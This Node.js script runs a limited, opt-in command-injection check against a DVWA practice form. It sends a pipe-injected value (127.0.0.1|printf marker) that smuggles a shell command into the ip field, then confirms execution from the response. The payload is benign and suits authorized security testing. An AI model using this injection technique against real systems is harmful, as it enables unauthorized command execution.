// Explicitly opted-in, four-request syntax comparison on the authorized DVWA form.
const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const fs = require('node:fs');
const https = require('node:https');
const path = require('node:path');

assert.equal(process.env.CERT_X_PUBLIC_COMMAND_SMOKE, '1', 'Set CERT_X_PUBLIC_COMMAND_SMOKE=1 for this bounded public check.');
const target = 'https://pentest-ground.com:4280/vulnerabilities/exec/';
const folder = path.join(process.env.LOCALAPPDATA || process.env.HOME, 'cert-x/verification');
fs.mkdirSync(folder, {recursive: true});
const file = path.join(folder, 'command-dvwa-syntax-' + new Date().toISOString().replace(/[:.]/g, '-') + '.json');
const nonce = crypto.randomBytes(6).toString('hex');
const marker = `certx_${nonce}_exec`;
const broken = `127.0.0.1|printf 'certx_%s_%s' '${nonce}' 'exec'|`;
const repaired = broken.slice(0, -1);
const evidence = {target, startedAt: new Date().toISOString(), requestLimit: 4, maxRequestsPerSecond: 2, marker, inputs: {broken, repaired}, requests: []};
let lastStart = 0;
const save = () => fs.writeFileSync(file, JSON.stringify(evidence, null, 2));

async function send(label, ip) {
  assert.ok(evidence.requests.length < 4);
  await new Promise(resolve => setTimeout(resolve, Math.max(0, lastStart + 500 - Date.now())));
  lastStart = Date.now();
  const body = Buffer.from(new URLSearchParams({ip, Submit: 'Submit'}).toString());
  const headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': body.length, 'Accept-Encoding': 'identity', Connection: 'close'};
  const record = {label, startedAt: new Date().toISOString(), request: {url: target, method: 'POST', headers, bodyBase64: body.toString('base64'), bodyUtf8: body.toString('utf8')}};
  evidence.requests.push(record);
  save();
  const response = await new Promise((resolve, reject) => {
    const req = https.request(target, {method: 'POST', headers, timeout: 20000}, res => {
      const chunks = [];
      res.on('data', chunk => chunks.push(chunk));
      res.on('error', reject);
      res.on('end', () => resolve({statusCode: res.statusCode, statusMessage: res.statusMessage, httpVersion: res.httpVersion, rawHeaders: res.rawHeaders, body: Buffer.concat(chunks)}));
    });
    req.on('timeout', () => req.destroy(new Error('Request timed out')));
    req.on('error', reject);
    req.end(body);
  });
  record.response = {statusCode: response.statusCode, statusMessage: response.statusMessage, httpVersion: response.httpVersion, rawHeaders: response.rawHeaders, bodyBase64: response.body.toString('base64'), bodyUtf8: response.body.toString('utf8')};
  record.finishedAt = new Date().toISOString();
  save();
  assert.equal(response.statusCode, 200, `${label}: unexpected HTTP status`);
  return record.response.bodyUtf8;
}

async function main() {
  assert.ok(!broken.includes(marker) && !repaired.includes(marker));
  const before = await send('baseline-before', '127.0.0.1');
  assert.match(before, /PING 127\.0\.0\.1|127\.0\.0\.1 ping statistics/, 'Baseline did not reach command form');
  const brokenResponse = await send('dangling-pipe', broken);
  const repairedResponse = await send('repaired-pipe', repaired);
  const after = await send('baseline-after', '127.0.0.1');
  evidence.results = {markerAbsentFromInputs: true, markerInBaselineBefore: before.includes(marker), markerInDanglingPipe: brokenResponse.includes(marker), markerInRepairedPipe: repairedResponse.includes(marker), markerInBaselineAfter: after.includes(marker)};
  evidence.finishedAt = new Date().toISOString();
  save();
  assert.deepEqual(evidence.results, {markerAbsentFromInputs: true, markerInBaselineBefore: false, markerInDanglingPipe: false, markerInRepairedPipe: true, markerInBaselineAfter: false});
  console.log(JSON.stringify({file, requests: evidence.requests.length, results: evidence.results}));
}

main().catch(error => {evidence.error = error.stack; save(); console.error(error); process.exitCode = 1;});
